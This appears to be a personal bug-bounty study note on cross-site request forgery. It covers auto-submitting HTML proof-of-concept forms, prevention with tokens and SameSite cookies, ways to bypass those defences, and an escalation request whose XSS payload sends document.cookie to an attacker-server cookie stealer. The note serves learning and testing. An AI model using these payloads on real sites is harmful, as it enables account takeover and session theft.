### what && how?
>*Cross-site request forgery* (CSRF) is a client side technique used to trick users to send state change HTTP requests.
>Attackers achieve this by using HTML pages that have auto submit form

### basic POC
```html
<html> 
<body onload=document.getElementById('csrf').submit()> 
	<form id='csrf' action="https://vulnsite.com/endpoint" method="POST" > 
		<input value="attacker@portswiger.com" type="email" name="email" hidden> 
		<button class="button" type="submit" hidden> Update email </button> 
	</form> 
</body> </html>
---------or
<html>
	<form id='csrf' action="https://vulnsite.com/endpoint" method="POST" > 
		<input value="attacker@portswiger.com" type="email" name="email" hidden> 
		<button class="button" type="submit" hidden> Update email </button> 
	</form> 
<script>document.getElementById("csrf-form").submit();</script>
</html>
```

### prevention
- csrf token: application sent a random token with it's HTML response for a GET state change request, the browsers send this token back with the request, then the app validate it    
- cookie `SameSite` flag 
	1. **`SameSite=Strict`**: This value restricts the cookie from being sent in cross-origin requests, which provides the highest level of security and privacy. The cookie will only be sent in requests originating from the same site where it was set.
	2. **`SameSite=Lax`**: This value allows cookies to be sent in certain cross-origin requests, primarily when the request is a top-level navigation (like clicking on a link) or when making a safe HTTP method (such as GET). This offers a balance between security and usability.
	3. **`SameSite=None`**: This value allows the cookie to be sent in cross-origin requests
	> Chrome and a few other browsers made `SameSite=Lax` the default cookie setting if it’s not explicitly set by the web application
	> for firefox You can enable it by going to about:config and setting `network.cookie.sameSite.laxByDefault` to true
	
	> when browser not sent the cookies with requests our attack will fail cuz application not make the change on victim behalf 
### hut for it 
- [ ] Spot State-Changing Actions, such sending tweets, or modify user settings like change password, mail,... delete mail,.. 
- [ ] Look for a Lack of CSRF Protections, by Intercept above requests looking for any prevention mechanism in place and try to bypass   
- [ ] Confirm the Vulnerability by use above POC or copy&past target html form
- [ ] host your POC and test it yourself

### Bypassing Protections
> the existence of protections doesn’t mean that the protection is comprehensive, well implemented, and impossible to bypass
1. for csrf token
- Exploit [[Clickjacking]]: If the endpoint uses CSRF tokens but the page itself is vulnerable to clickjacking, you’ll be able to achieve the same results as a CSRF attack on the endpoint
- Change the Request Method(from post->GET) and delete token from request, use `<img>`
- Bypass CSRF Tokens Stored on the Server, set csrf_token with null value `csrf_token=`
- Bypass Double-Submit CSRF Tokens using ==CRLF==(response spliting), Double-Submit in body and cookie
- Bypass CSRF Referer Header Check, use `<meta name="referrer" content="no-referrer">` in your POC or set your Referer Header to some thing allowed, use open redirect payloads
- Bypass CSRF Protection by Using [[XSS]] to steal or fetch user's csrf token
2. `SameSite` flag
- Bypass `SameSite=Lax` and state-changing requests with the GET HTTP method, attacker can redirect victim to link using `document.location =`
- or by overwrite request method 
- if site set `SameSite=None` then the browser not overwrite it and we can set request with cookies
more ByPasses from [my portswigger lab solve](https://www.notion.so/mortorky/csrf-7039788effcc442d8200cac05f32849a?pvs=4) 

#### Escalating attack
###### - combine CSRF with self-XSS, you can often turn the self-XSS into stored [[XSS]].
simple poc
```request
POST /change_account_nickname 
Host: finance.example.com 
Cookie: session_cookie=YOUR_SESSION_COOKIE; 
....
account=0&nickname="<script>document.location='http://attacker_server_ip/cookie_stealer.php?c='+document.cookie;" &csrf_token=WRONG_TOKEN
```
The next time a user logs into the account and views their dashboard, they’ll trigger the XSS.
###### [[Account take over (ATO)]] by Using CSRF
account takeover issues occur when a CSRF vulnerability exists in critical functionality, like the code that creates a password, changes the password, changes the email address, or resets the password